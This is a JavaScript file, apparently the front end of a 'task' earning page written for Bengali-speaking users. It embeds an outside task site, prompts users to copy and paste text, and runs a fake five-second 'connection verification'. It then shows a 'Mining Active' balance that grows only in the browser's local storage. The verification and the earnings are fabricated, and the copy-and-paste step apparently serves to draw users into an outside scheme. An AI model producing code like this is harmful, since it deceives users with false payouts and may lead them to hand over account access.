const _data = {
    target: "https://www.taskm4u.com/#/HangTask"
};

let balance = parseFloat(localStorage.getItem('my_balance')) || 0;

function updateDisplay() {
    document.getElementById('mainPoints').innerText = balance.toFixed(2) + " PT";
    localStorage.setItem('my_balance', balance);
}

function openWork() {
    document.getElementById('view-main').classList.remove('active-view');
    document.getElementById('view-task').classList.add('active-view');
    document.getElementById('taskIframe').src = _data.target;
}

function copyData(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert("কপি হয়েছে! এবার পেস্ট করুন।");
    });
}

function verifyNow() {
    const btn = document.getElementById('verifyBtn');
    btn.innerText = "Verifying Connection...";
    btn.style.background = "#555";
    btn.disabled = true;

    // ৫ সেকেন্ডের ভেরিফিকেশন প্রসেস
    setTimeout(() => {
        alert("সফলভাবে যুক্ত হয়েছে! এখন থেকে পয়েন্ট জমা হবে।");
        document.getElementById('view-task').classList.remove('active-view');
        document.getElementById('view-main').classList.add('active-view');
        startEarning();
    }, 5000);
}

function startEarning() {
    document.getElementById('status').innerText = "● Mining Active (30 PT/hr)";
    document.getElementById('status').style.color = "#25D366";

    setInterval(() => {
        balance += (30 / 3600); // প্রতি সেকেন্ডে পয়েন্ট আপডেট
        updateDisplay();
    }, 1000);
}

// শুরুতে ব্যালেন্স আপডেট
updateDisplay();
